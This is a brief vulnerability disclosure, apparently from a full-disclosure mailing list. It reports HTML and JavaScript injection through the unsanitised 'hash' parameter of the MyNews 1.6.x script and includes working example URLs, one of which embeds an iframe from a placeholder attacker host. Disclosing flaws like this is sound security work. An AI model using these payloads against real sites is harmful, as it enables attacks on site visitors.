I know its basic, but I am a supporter of FD and therefore  
planetluc.com has to be
blamed now! I checked their script MyNews in version 1.6.4 today and  
then some
other versions, all are vulnerable to HTML and JS injection.

____________________
|| 0x02: INFORMATION

The MyNews script by planetluc.com in all versions of the 1.6.X tree is
vulnerable to HTML and JS injection due to no sanitation of the "hash"
value in combination with the action "admin".

_____________________
|| 0x03: EXPLOITATION

No exploit is needed to test this vulnerability. You just need a working
web browser.

1: HTML Injection

To make a HTML injectioni, visit the websites main page. The name  
might differ
from the original name "mynews.inc.php", mostly its called  
"index.php". Now
construct a malformed URL as follows:

http://www.example.com/index.php?hash="><iframe src=http:// 
www.evil.com/ height=500px width=500px></iframe><!--&do=admin

Of course you can manipulate the values of "height" and "width" like you
want to. Do it the way it best fits to your needs!

2: JavaScript Injection

JS injection is similar to HTML injection, just that you put a JS code
in the "hash" parameter. Let me show you two examples:

http://www.example.com/index.php?hash="><script>alert(1337);</ 
script><!--&do=admin

or

http://www.example.com/index.php?hash="><script>alert("XSS");</ 
script><!--&do=admin

Sometimes using strings doesn't work, so test it first!
